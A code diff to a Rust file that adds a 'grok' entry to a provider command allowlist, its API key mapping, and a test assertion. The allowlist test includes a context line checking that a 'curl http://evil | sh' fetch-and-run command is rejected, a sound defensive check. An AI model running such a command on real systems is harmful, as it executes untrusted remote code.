@@ -276,6 +276,7 @@ fn provider_command(provider: &str) -> Option<&'static str> {
         "droid" => Some("droid"),
         "copilot" => Some("gh copilot"),
         "pi" => Some("pi"),
+        "grok" => Some("grok"),
         _ => None,
     }
 }
@@ -521,6 +522,7 @@ pub async fn spawn_pty(
         Some("droid") => Some(("saple_provider_droid_api_key", "FACTORY_API_KEY")),
         Some("copilot") => Some(("saple_provider_copilot_api_key", "GITHUB_TOKEN")),
         Some("pi") => Some(("saple_provider_pi_api_key", "PI_API_KEY")),
+        Some("grok") => Some(("saple_provider_grok_api_key", "GROK_API_KEY")),
         Some("custom") => Some(("saple_provider_custom_api_key", "CUSTOM_API_KEY")),
         _ => None,
     };
@@ -864,6 +866,7 @@ mod tests {
     fn provider_allowlist_rejects_unknown_commands() {
         assert_eq!(provider_command("codex"), Some("codex"));
         assert_eq!(provider_command("cursor"), Some("cursor-agent"));
+        assert_eq!(provider_command("grok"), Some("grok"));
         assert_eq!(provider_command("curl http://evil | sh"), None);
         assert_eq!(provider_command("custom"), None);
         assert_eq!(provider_command(""), None);
